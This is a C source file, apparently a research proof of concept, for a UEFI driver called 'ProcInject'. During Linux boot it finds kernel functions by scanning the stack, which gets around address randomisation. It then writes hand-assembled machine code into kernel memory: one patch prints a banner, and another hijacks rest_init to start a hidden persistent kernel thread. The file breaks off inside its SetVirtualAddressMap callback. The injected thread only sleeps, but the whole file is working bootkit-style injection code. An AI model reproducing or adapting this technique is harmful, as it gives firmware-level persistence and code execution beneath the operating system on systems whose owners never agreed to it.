#include "drv.h"
#include "kernel_config.h"
#include "logging.h"
#include "inject_context.h"
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeLib.h>

UINT64 *
AsmGetRsp(VOID);

EFI_SYSTEM_TABLE* mSysTable;
//
// We support unload (but deny it)
//
const UINT8 _gDriverUnloadImageCount = 1;

//
// We require at least UEFI 2.0
//
const UINT32 _gUefiDriverRevision = 0x200;
const UINT32 _gDxeRevision = 0x200;

//
// Our name
//
CHAR8 *gEfiCallerBaseName = "ProcInject";

// COM1 port base address
#define COM1_PORT 0x402 // Use QEMU debug console port instead of 0x3F8
#define LSR_OFFSET 5 // Line Status Register
#define LSR_THRE 0x20 // Transmit Holding Register

VOID
EFIAPI
SerialOutByte(
    IN UINT8 c
)
{
    // Poll LSR until THR is empty
    while ((__inbyte(COM1_PORT + LSR_OFFSET) & LSR_THRE) == 0) {
        CpuPause();
    }

    // Write the character to the Data Register
    __outbyte(COM1_PORT, c);
}

VOID
EFIAPI
SerialOutString(
    IN UINT8* Str
)
{
    while (*Str) {
        if (*Str == '\n') {
            SerialOutByte('\r'); // Add carriage return before newline
        }
        SerialOutByte(*Str);
        Str++;
    }
}

//
// Code templates for kernel patching
//

UINT8 printk_banner_template[] = {
    0x50, // push rax
    0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00, // mov rdi, <banner>
    0xe8, 0x00, 0x00, 0x00, 0x00,  // call printk
    0x58  // pop rax
};

UINT8 proc_template[] = {
	// thread_name:
	    0x3c, 0x55, 0x45, 0x46, 0x49, 0x3e, 0x00, // "<UEFI>"
	// code starts here:
	    0x57, // push rdi
	// loop1:
		0x48, 0xc7, 0xc7, 0x00, 0x5c, 0x26, 0x05,  // mov rdi, 86400*1000 (1 day)
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, msleep
        0xFF, 0xD0,                                // call msleep(86400*1000)
		0xe9, 0xE8, 0xFF, 0xFF, 0xFF,              // jmp loop1
		0x5f, // pop rdi
		0x48, 0x31, 0xc0, // xor rax,rax
		0xc3  // ret
}; // 37 (0x25) bytes

UINT8 patch_code_2[] = {
	// Code to allocate new kernel thread goes here
/* 0*/	0x57, // push rdi
/* 1*/	0x56, // push rsi
/* 2*/	0x51, // push rcx
/* 3*/	0x52, // push rdx
	// thread_func = __kmalloc(sizeof(proc_template), GPF_KERNEL | GPF_ZERO = 0x400CC0
/* 4*/	0x48, 0xC7, 0xC7, 0x25, 0x00, 0x00, 0x00, // mov rdi, 0x25 (sizeof proc_template)
/* b*/	0x48, 0xC7, 0xC6, 0xC0, 0x0C, 0x40, 0x00, // mov rsi 0x400CC0 (GPF_KERNEL | GPF_ZERO)
/*12*/	0xe8, 0x00, 0x00, 0x00, 0x00,             // call __kmalloc(sizeof(proc_template), GPF_KERNEL | GPF_ZERO)  
	// Copy proc_template into new thread code space, including already fixed-up call to msleep
/*17*/	0x48, 0x89, 0xc7,                         // mov rdi, rax
/*1a*/	0x48, 0x8D, 0x35, 0xBA, 0xFF, 0xFF, 0xFF, // lea rsi, [rip-70] ; start of proc_template
/*21*/	0xFC,                                     // cld
/*22*/	0xB9, 0x25, 0x00, 0x00, 0x00,             // mov ecx, 0x25 ; sizeof(proc_template)
/*27*/	0xF3, 0xA4,                               // rep movsb
	// task = kthread_create_on_node(tfunc, 0, -1, "<UEFI>");
/*29*/	0x48, 0x89, 0xc7,                         // mov rdi, rax
/*2c*/  0x48, 0x83, 0xC7, 0x07,                   // add rdi, 7 (point to the start of the code)
/*30*/	0x48, 0x31, 0xF6,                         // xor rsi, rsi (rsi = 0)
/*33*/	0x48, 0x31, 0xD2,                         // xor rdx, rdx (rdx = 0)
/*36*/	0x48, 0xF7, 0xD2,                         // not rdx (rdx = -1)
/*39*/	0x48, 0x89, 0xC1,                         // mov rcx, rax ("<UEFI>")
/*3c*/	0xe8, 0x00, 0x00, 0x00, 0x00,             // call kthread_create_on_node

	    0x5a, // pop rdx
	    0x59, // pop rcx
	    0x5e, // pop rsi
	    0x5f, // pop rdi
	    0xe8, 0x00, 0x00, 0x00, 0x00, // call complete(&kthreadd_done)
	    0xe9, 0x00, 0x00, 0x00, 0x00  // jmp back into rest_init() code
};

// Configuration and state
INJECT_CONFIG gInjectConfig;

// UEFI event handle for SetVirtualAddressMap callback
EFI_EVENT mVirtMemEvt;

#define PUT_FIXUP(cp, addr) *(INT32*)cp = (INT32)(INT64)(addr - (cp + 4))

/**
 * Verify if code pointer matches efi_enter_virtual_mode return address
 * Uses kernel configuration pattern matching
 *
 * @param cp    Code pointer to verify
 * @return TRUE if pattern matches, FALSE otherwise
 */
BOOLEAN
VerifyEfiEnterVirtualMode(UINT8* cp) {
    return VerifyEfiEnterVirtualModePattern(cp, gInjectConfig.KernelConfig);
}

//
// ============================================================================
// Helper Functions for VirtMemCallback
// ============================================================================
//

/**
 * Find efi_enter_virtual_mode return address on the stack
 *
 * Scans the call stack looking for a return address that points to code
 * matching the efi_enter_virtual_mode pattern. This is the key to finding
 * the printk address and subsequently all other kernel functions.
 * Results are stored in the context's Stack structure.
 *
 * @param Context   Inject runtime context (Stack.StackPointer must be set)
 * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
 */
EFI_STATUS
FindEfiEnterVirtualModeReturnAddr(
    IN OUT INJECT_RUNTIME_CONTEXT* Context
)
{
    UINTN i;
    UINT8* candidateAddr;
    EFI_STATUS status;
    UINT64* Rsp;

    LOG_FUNCTION_ENTRY();

    if (!ValidateInjectContext(Context)) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Invalid context to FindEfiEnterVirtualModeReturnAddr");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    Rsp = Context->Stack.StackPointer;
    if (Rsp == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Stack pointer not set in context");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    LOG_DEBUG("Scanning stack for efi_enter_virtual_mode return address (0x28 - 0x48)");

    //
    // Search for the return address into efi_enter_virtual_mode
    // We scan from offset 0x28 to 0x48 on the stack
    //
    for (i = 0x28; i < 0x48; i++) {
        //
        // Check if this looks like a kernel address (high canonical address)
        //
        if ((Rsp[i] & 0xFFFFFFFF00000000L) == 0xFFFFFFFF00000000L) {
            candidateAddr = (UINT8*)Rsp[i];
            LOG_VERBOSE("Checking stack[0x%x] = 0x%llx", i, candidateAddr);

            //
            // Verify if this address points to the expected code pattern
            //
            if (VerifyEfiEnterVirtualMode(candidateAddr)) {
                //
                // Store results in context
                //
                Context->Stack.EevmReturnAddr = candidateAddr;
                Context->Stack.EevmStackIndex = i;

                LOG_INFO("Found efi_enter_virtual_mode return address: 0x%llx (stack index 0x%x)",
                        candidateAddr, i);

                status = EFI_SUCCESS;
                LOG_FUNCTION_EXIT(status);
                return status;
            }
        }
    }

    LOG_ERROR(INJECT_ERROR_EEVM_NOT_FOUND,
             "efi_enter_virtual_mode return address not found in stack range");

    status = EFI_NOT_FOUND;
    LOG_FUNCTION_EXIT(status);
    return status;
}

/**
 * Calculate all kernel function addresses from the discovered printk address
 *
 * Uses the kernel configuration to calculate offsets to other required
 * kernel functions. Also fixes up the msleep call in the proc_template.
 * Results are stored in the context's KernelFuncs structure.
 *
 * @param Context   Inject runtime context (Stack.EevmReturnAddr must be set)
 * @return EFI_SUCCESS if successful
 */
EFI_STATUS
CalculateKernelFunctionAddresses(
    IN OUT INJECT_RUNTIME_CONTEXT* Context
)
{
    INT32 offset;
    UINT8* cp;
    UINT8* EevmReturnAddr;
    EFI_STATUS status;

    LOG_FUNCTION_ENTRY();

    if (!ValidateInjectContext(Context)) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Invalid context to CalculateKernelFunctionAddresses");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    EevmReturnAddr = Context->Stack.EevmReturnAddr;
    if (EevmReturnAddr == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "EevmReturnAddr not set in context");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    //
    // Calculate printk address from the call instruction
    // The call instruction is at offset 0x10 from the return address
    //
    // CRITICAL: Validate EevmReturnAddr is in kernel range before dereferencing
    //
    if ((UINT64)EevmReturnAddr < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "EevmReturnAddr 0x%llx below minimum kernel address",
                 (UINT64)EevmReturnAddr);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    //
    // Validate pointer arithmetic for reading offset
    //
    UINT8* readAddr = EevmReturnAddr + 0x10;
    if ((UINT64)readAddr < (UINT64)EevmReturnAddr) {
        LOG_ERROR(INJECT_ERROR_POINTER_OVERFLOW,
                 "Pointer overflow: EevmReturnAddr + 0x10 wrapped around");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    offset = *(INT32*)readAddr;
    Context->KernelFuncs.Printk = (EevmReturnAddr + 0x14) + offset;

    //
    // CRITICAL: Validate calculated printk address is in kernel range
    //
    if ((UINT64)Context->KernelFuncs.Printk < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "Calculated printk address 0x%llx below minimum kernel address",
                 (UINT64)Context->KernelFuncs.Printk);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    LOG_ADDRESS(LOG_LEVEL_INFO, "printk", Context->KernelFuncs.Printk);
    LOG_VERBOSE("printk address validated: 0x%llx", (UINT64)Context->KernelFuncs.Printk);

    //
    // Use kernel configuration to calculate other function addresses
    //
    Context->KernelFuncs.Kmalloc = CalculateKernelAddress(Context->KernelFuncs.Printk,
                                                          Context->Config->KernelConfig->PrintkToKmalloc);
    if ((UINT64)Context->KernelFuncs.Kmalloc < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "Calculated __kmalloc address 0x%llx below minimum kernel address",
                 (UINT64)Context->KernelFuncs.Kmalloc);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }
    LOG_ADDRESS(LOG_LEVEL_DEBUG, "__kmalloc", Context->KernelFuncs.Kmalloc);

    Context->KernelFuncs.Msleep = CalculateKernelAddress(Context->KernelFuncs.Printk,
                                                         Context->Config->KernelConfig->PrintkToMsleep);
    if ((UINT64)Context->KernelFuncs.Msleep < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "Calculated msleep address 0x%llx below minimum kernel address",
                 (UINT64)Context->KernelFuncs.Msleep);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }
    LOG_ADDRESS(LOG_LEVEL_DEBUG, "msleep", Context->KernelFuncs.Msleep);

    Context->KernelFuncs.KthreadCreateOnNode = CalculateKernelAddress(Context->KernelFuncs.Printk,
                                                                       Context->Config->KernelConfig->PrintkToKthreadCreateOnNode);
    if ((UINT64)Context->KernelFuncs.KthreadCreateOnNode < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "Calculated kthread_create_on_node address 0x%llx below minimum kernel address",
                 (UINT64)Context->KernelFuncs.KthreadCreateOnNode);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }
    LOG_ADDRESS(LOG_LEVEL_DEBUG, "kthread_create_on_node", Context->KernelFuncs.KthreadCreateOnNode);

    //
    // Fix up the msleep call in our kthread code template
    //
    cp = &proc_template[17];
    *(UINT64*)cp = (UINT64)Context->KernelFuncs.Msleep;
    LOG_DEBUG("Fixed up msleep call in proc_template");

    status = EFI_SUCCESS;
    LOG_FUNCTION_EXIT(status);
    return status;
}

/**
 * Install Patch 1: Printk banner message
 *
 * Patches the kernel code immediately before the efi_enter_virtual_mode
 * return address to call printk with our banner message. This allows us
 * to announce ourselves during boot.
 * Results are stored in the context's Patches structure.
 *
 * @param Context   Inject runtime context
 * @return EFI_SUCCESS if patch installed successfully
 */
EFI_STATUS
InstallPatch1_PrintkBanner(
    IN OUT INJECT_RUNTIME_CONTEXT* Context
)
{
    UINTN i, j;
    UINT8* cp;
    UINT8* destptr;
    UINT64* Rsp;
    UINT8* EevmReturnAddr;
    UINTN ReturnIndex;
    UINT8 banner[] = "\001\063ProcInject v0.7\n";
    EFI_STATUS status;

    LOG_FUNCTION_ENTRY();

    if (!ValidateInjectContext(Context)) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Invalid context to InstallPatch1_PrintkBanner");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    Rsp = Context->Stack.StackPointer;
    EevmReturnAddr = Context->Stack.EevmReturnAddr;
    ReturnIndex = Context->Stack.EevmStackIndex;

    if (Rsp == NULL || EevmReturnAddr == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Stack pointer or EevmReturnAddr not set in context");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    //
    // Calculate destination for patch code
    // We write immediately before the return address in already-executed code
    //
    destptr = EevmReturnAddr - (sizeof(banner) + sizeof(printk_banner_template));
    LOG_DEBUG("Patch 1 destination: 0x%llx", destptr);

    //
    // CRITICAL: Validate destination address before writing
    // Ensure we're writing to kernel address space
    //
    if ((UINT64)destptr < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "Patch 1 destination 0x%llx below minimum kernel address 0x%llx",
                 (UINT64)destptr, INJECT_MIN_KERNEL_ADDRESS);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    //
    // Validate pointer arithmetic didn't overflow (destptr should be < EevmReturnAddr)
    //
    if ((UINT64)destptr >= (UINT64)EevmReturnAddr) {
        LOG_ERROR(INJECT_ERROR_POINTER_OVERFLOW,
                 "Patch 1 destination 0x%llx >= EevmReturnAddr 0x%llx (overflow)",
                 (UINT64)destptr, (UINT64)EevmReturnAddr);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    LOG_VERBOSE("Patch 1 destination validated: 0x%llx", (UINT64)destptr);

    //
    // Copy the banner string
    //
    for (i = 0; i < sizeof(banner); i++) {
        destptr[i] = banner[i];
    }
    LOG_VERBOSE("Copied banner string (%d bytes)", sizeof(banner));

    //
    // Copy the printk call template
    //
    for (j = 0; j < sizeof(printk_banner_template); j++) {
        destptr[i + j] = printk_banner_template[j];
    }
    LOG_VERBOSE("Copied printk template (%d bytes)", sizeof(printk_banner_template));

    //
    // Fix up the addresses in the patched code
    // 1. mov rdi, Message1 (pointer to banner string)
    //
    cp = destptr + (sizeof(banner) + 4);
    *(INT32*)cp = (INT32)(INT64)destptr;
    LOG_VERBOSE("Fixed up banner address");

    //
    // 2. call printk (relative call)
    //
    cp += (4 + 1);
    PUT_FIXUP(cp, Context->KernelFuncs.Printk);
    LOG_VERBOSE("Fixed up printk call");

    //
    // Modify the stack return address to point to our patched code
    // CRITICAL: Validate ReturnIndex before stack write to prevent corruption
    //
    if (ReturnIndex < INJECT_EEVM_SCAN_START || ReturnIndex >= INJECT_EEVM_SCAN_END) {
        LOG_ERROR(INJECT_ERROR_STACK_INDEX_OUT_OF_RANGE,
                 "ReturnIndex 0x%x out of valid range (0x%x - 0x%x)",
                 ReturnIndex, INJECT_EEVM_SCAN_START, INJECT_EEVM_SCAN_END);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    if (ReturnIndex >= INJECT_MAX_STACK_SCAN_DEPTH) {
        LOG_ERROR(INJECT_ERROR_STACK_INDEX_OUT_OF_RANGE,
                 "ReturnIndex 0x%x exceeds maximum stack scan depth 0x%x",
                 ReturnIndex, INJECT_MAX_STACK_SCAN_DEPTH);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    Rsp[ReturnIndex] = (UINT64)(destptr + sizeof(banner));
    LOG_DEBUG("Modified stack return address to 0x%llx (validated index 0x%x)",
             Rsp[ReturnIndex], ReturnIndex);

    //
    // Store patch location in context
    //
    Context->Patches.Patch1Destination = destptr;
    Context->Patches.Patch1Installed = TRUE;

    LOG_INFO("Patch 1 installed successfully at 0x%llx", destptr);

    status = EFI_SUCCESS;
    LOG_FUNCTION_EXIT(status);
    return status;
}

/**
 * Find arch_call_rest_init address in start_kernel
 *
 * Searches the stack for the start_kernel return address by looking for
 * a sequence of call instructions followed by mfence. The last call before
 * mfence is arch_call_rest_init.
 * Results are stored in the context.
 *
 * @param Context   Inject runtime context
 * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
 */
EFI_STATUS
FindArchCallRestInit(
    IN OUT INJECT_RUNTIME_CONTEXT* Context
)
{
    UINTN i, j;
    UINT8* cp;
    BOOLEAN found;
    INT32 offset;
    UINT64* Rsp;
    UINTN StartIndex;
    EFI_STATUS status;

    LOG_FUNCTION_ENTRY();

    if (!ValidateInjectContext(Context)) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Invalid context to FindArchCallRestInit");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    Rsp = Context->Stack.StackPointer;
    StartIndex = Context->Stack.EevmStackIndex;

    if (Rsp == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Stack pointer not set in context");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    LOG_DEBUG("Searching for start_kernel return address (from stack[0x%x] to 0x40)", StartIndex + 1);

    //
    // Search further up the stack for start_kernel return address
    //
    for (i = StartIndex + 1; i < 0x40; i++) {
        if ((Rsp[i] & 0xFFFFFFFF00000000L) == 0xFFFFFFFF00000000L) {
            cp = (UINT8*)Rsp[i];
            found = TRUE;

            LOG_VERBOSE("Checking stack[0x%x] = 0x%llx for call pattern", i, (UINT64)cp);

            //
            // Verify this looks like start_kernel by checking for
            // at least 10 consecutive call instructions
            //
            for (j = 0; j < 10; j++) {
                if (*cp != 0xe8) {  // 0xe8 = call opcode
                    found = FALSE;
                    LOG_VERBOSE("Call pattern broken at offset %d (opcode 0x%x)", j, *cp);
                    break;
                }
                cp += 5;  // call instruction is 5 bytes
            }

            if (found) {
                Context->Stack.StartKernelRetAddr = (UINT8*)Rsp[i];
                LOG_DEBUG("Found 10+ consecutive calls at 0x%llx", Context->Stack.StartKernelRetAddr);

                //
                // Skip over remaining call instructions until we find mfence
                //
                while (*cp == 0xe8) {
                    cp += 5;
                }

                //
                // Check for mfence instruction (0x0f 0xae 0xf0)
                //
                if (*cp == 0x0f && *(cp + 1) == 0xae && *(cp + 2) == 0xf0) {
                    //
                    // Back up to the last call instruction (arch_call_rest_init)
                    //
                    cp -= 4;  // Point to offset within call instruction
                    offset = *(INT32*)cp;
                    Context->InitFuncs.ArchCallRestInit = (cp + 4) + offset;

                    LOG_INFO("Found start_kernel return address: 0x%llx", Context->Stack.StartKernelRetAddr);
                    LOG_ADDRESS(LOG_LEVEL_INFO, "arch_call_rest_init", Context->InitFuncs.ArchCallRestInit);

                    status = EFI_SUCCESS;
                    LOG_FUNCTION_EXIT(status);
                    return status;
                }
                else {
                    LOG_ERROR(INJECT_ERROR_MFENCE_NOT_FOUND,
                             "mfence instruction not found after call sequence (found 0x%x%x%x)",
                             *cp, *(cp + 1), *(cp + 2));
                }
            }
        }
    }

    LOG_ERROR(INJECT_ERROR_START_KERNEL_NOT_FOUND,
             "start_kernel return address not found in stack range");

    status = EFI_NOT_FOUND;
    LOG_FUNCTION_EXIT(status);
    return status;
}

/**
 * Find rest_init and the complete(&kthreadd_done) call within it
 *
 * Analyzes arch_call_rest_init to find rest_init, then locates the
 * complete(&kthreadd_done) call that we need to patch.
 * Results are stored in the context's InitFuncs structure.
 *
 * @param Context   Inject runtime context
 * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
 */
EFI_STATUS
FindRestInitCompleteCall(
    IN OUT INJECT_RUNTIME_CONTEXT* Context
)
{
    UINT8* cp;
    INT32 offset;
    UINT8* ArchCallRestInit;
    EFI_STATUS status;

    LOG_FUNCTION_ENTRY();

    if (!ValidateInjectContext(Context)) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Invalid context to FindRestInitCompleteCall");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    ArchCallRestInit = Context->InitFuncs.ArchCallRestInit;
    if (ArchCallRestInit == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "ArchCallRestInit not set in context");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    cp = ArchCallRestInit;
    LOG_DEBUG("Analyzing arch_call_rest_init prologue at 0x%llx", (UINT64)cp);

    //
    // Verify arch_call_rest_init function prologue:
    //   nop (multi-byte)
    //   push rbp
    //   mov rbp, rsp
    //   call rest_init
    //
    LOG_VERBOSE("Checking prologue bytes: 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x",
                *cp, *(cp+5), *(cp+6), *(cp+7), *(cp+8), *(cp+9));

    if (*cp != 0x0f || *(cp + 5) != 0x55 || *(cp + 6) != 0x48 ||
        *(cp + 7) != 0x89 || *(cp + 8) != 0xe5 || *(cp + 9) != 0xe8) {
        LOG_ERROR(INJECT_ERROR_REST_INIT_PROLOGUE_INVALID,
                 "arch_call_rest_init prologue does not match expected pattern");
        LOG_DEBUG("Expected: 0x0f ... 0x55 0x48 0x89 0xe5 0xe8");
        status = EFI_NOT_FOUND;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    //
    // Extract rest_init address from call instruction
    //
    cp += 10;  // Point to offset within call instruction
    offset = *(INT32*)cp;
    Context->InitFuncs.RestInit = (cp + 4) + offset;

    LOG_ADDRESS(LOG_LEVEL_INFO, "rest_init", Context->InitFuncs.RestInit);

    //
    // Find the complete(&kthreadd_done) call in rest_init
    // Use kernel configuration for the offset
    //
    cp = Context->InitFuncs.RestInit + Context->Config->KernelConfig->RestInitToCompleteOffset;
    LOG_DEBUG("Looking for complete() call at rest_init+0x%x (0x%llx)",
             Context->Config->KernelConfig->RestInitToCompleteOffset, (UINT64)cp);

    //
    // Verify this is a call instruction
    //
    if (*cp != 0xe8) {
        LOG_ERROR(INJECT_ERROR_COMPLETE_INVALID_INSN,
                 "Expected call instruction (0xe8) at rest_init+0x%x, found 0x%x",
                 Context->Config->KernelConfig->RestInitToCompleteOffset, *cp);
        status = EFI_NOT_FOUND;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    Context->InitFuncs.ReturnFromPatch = cp;
    cp++;  // Point to offset
    offset = *(INT32*)cp;
    Context->InitFuncs.Complete = (cp + 4) + offset;

    LOG_ADDRESS(LOG_LEVEL_DEBUG, "complete", Context->InitFuncs.Complete);
    LOG_DEBUG("Return-from-patch address: 0x%llx", (UINT64)Context->InitFuncs.ReturnFromPatch);

    status = EFI_SUCCESS;
    LOG_FUNCTION_EXIT(status);
    return status;
}

/**
 * Install Patch 2: Kernel thread creation
 *
 * Installs the kernel thread creation code that will run after kthreadd
 * is initialized but before the system goes multi-threaded. This is the
 * main payload that creates our persistent thread.
 * Results are stored in the context's Patches structure.
 *
 * @param Context   Inject runtime context
 * @return EFI_SUCCESS if patch installed successfully
 */
EFI_STATUS
InstallPatch2_KthreadCreate(
    IN OUT INJECT_RUNTIME_CONTEXT* Context
)
{
    UINT8* cp;
    UINTN i;
    UINT8* patch_2;
    UINT8* StartKernelRetAddr;
    UINT8* ReturnFromPatch;
    UINT8* CompleteCall;
    EFI_STATUS status;

    LOG_FUNCTION_ENTRY();

    if (!ValidateInjectContext(Context)) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Invalid context to InstallPatch2_KthreadCreate");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    StartKernelRetAddr = Context->Stack.StartKernelRetAddr;
    ReturnFromPatch = Context->InitFuncs.ReturnFromPatch;
    CompleteCall = Context->InitFuncs.Complete;

    if (StartKernelRetAddr == NULL || ReturnFromPatch == NULL || CompleteCall == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "Required addresses not set in context");
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    //
    // Calculate patch location
    //
    patch_2 = StartKernelRetAddr - sizeof(patch_code_2);
    LOG_DEBUG("Patch 2 destination: 0x%llx", (UINT64)patch_2);

    //
    // CRITICAL: Validate patch_2 address before writing
    //
    if ((UINT64)patch_2 < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "Patch 2 destination 0x%llx below minimum kernel address 0x%llx",
                 (UINT64)patch_2, INJECT_MIN_KERNEL_ADDRESS);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    if ((UINT64)patch_2 >= (UINT64)StartKernelRetAddr) {
        LOG_ERROR(INJECT_ERROR_POINTER_OVERFLOW,
                 "Patch 2 destination 0x%llx >= StartKernelRetAddr 0x%llx (overflow)",
                 (UINT64)patch_2, (UINT64)StartKernelRetAddr);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    //
    // Calculate proc_template location (before patch_2)
    //
    cp = StartKernelRetAddr - (sizeof(patch_code_2) + sizeof(proc_template));
    LOG_DEBUG("proc_template will be at: 0x%llx", (UINT64)cp);

    //
    // CRITICAL: Validate proc_template destination address
    //
    if ((UINT64)cp < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "proc_template destination 0x%llx below minimum kernel address 0x%llx",
                 (UINT64)cp, INJECT_MIN_KERNEL_ADDRESS);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    if ((UINT64)cp >= (UINT64)patch_2) {
        LOG_ERROR(INJECT_ERROR_POINTER_OVERFLOW,
                 "proc_template destination 0x%llx >= patch_2 0x%llx (invalid layout)",
                 (UINT64)cp, (UINT64)patch_2);
        status = EFI_INVALID_PARAMETER;
        LOG_FUNCTION_EXIT(status);
        return status;
    }

    LOG_VERBOSE("Patch 2 destinations validated: proc_template=0x%llx, patch_2=0x%llx",
               (UINT64)cp, (UINT64)patch_2);

    //
    // Write the proc_template (thread code + data) immediately before patch_2
    // This goes in already-executed init code that will be reclaimed
    //
    for (i = 0; i < sizeof(proc_template); i++) {
        *cp++ = proc_template[i];
    }
    LOG_VERBOSE("Copied proc_template (%d bytes)", sizeof(proc_template));

    //
    // Write the patch_2 code (kthread allocation and creation)
    //
    cp = patch_2;
    for (i = 0; i < sizeof(patch_code_2); i++) {
        *cp++ = patch_code_2[i];
    }
    LOG_VERBOSE("Copied patch_code_2 (%d bytes)", sizeof(patch_code_2));

    //
    // Fix up the call addresses in patch_2
    //

    // 1. call __kmalloc
    cp = patch_2 + 0x13;
    PUT_FIXUP(cp, Context->KernelFuncs.Kmalloc);
    LOG_VERBOSE("Fixed up __kmalloc call at offset 0x13");

    // 2. call kthread_create_on_node
    cp = patch_2 + 0x3d;
    PUT_FIXUP(cp, Context->KernelFuncs.KthreadCreateOnNode);
    LOG_VERBOSE("Fixed up kthread_create_on_node call at offset 0x3d");

    // 3. call complete(&kthreadd_done)
    cp = patch_2 + (sizeof(patch_code_2) - 9);
    PUT_FIXUP(cp, CompleteCall);
    LOG_VERBOSE("Fixed up complete() call");

    // 4. jmp back to rest_init
    cp = patch_2 + (sizeof(patch_code_2) - 4);
    PUT_FIXUP(cp, (ReturnFromPatch + 5));
    LOG_VERBOSE("Fixed up return jump to 0x%llx", (UINT64)(ReturnFromPatch + 5));

    //
    // Patch the rest_init() code to jump to our patch_2
    //
    cp = ReturnFromPatch;
    *cp = 0xe9;  // direct near jmp opcode
    cp++;
    PUT_FIXUP(cp, patch_2);
    LOG_DEBUG("Patched rest_init at 0x%llx with jump to patch_2", (UINT64)ReturnFromPatch);

    //
    // Store patch location in context
    //
    Context->Patches.Patch2Destination = patch_2;
    Context->Patches.Patch2Installed = TRUE;

    LOG_INFO("Patch 2 installed successfully at 0x%llx", (UINT64)patch_2);

    status = EFI_SUCCESS;
    LOG_FUNCTION_EXIT(status);
    return status;
}

/**
 * SetVirtualAddressMap (SVAM) callback
 *
 * This callback is invoked during Linux kernel boot when the system
 * transitions from physical to virtual address mode. At this point,
 * KASLR has already occurred, so we can discover kernel function
 * addresses and install our patches.
 *
 * The callback performs the following steps:
 * 1. Find efi_enter_virtual_mode return address on the stack
 * 2. Calculate kernel function addresses (printk, __kmalloc, etc.)
 * 3. Install Patch 1: Printk banner message
 * 4. Find arch_call_rest_init and rest_init
 * 5. Install Patch 2: Kernel thread creation code
 *
 * @param Event     The event that triggered this callback
 * @param Context   Optional context (unused)
 */
VOID
EFIAPI
VirtMemCallback(
	IN EFI_EVENT Event,
	IN VOID* Context
)
{
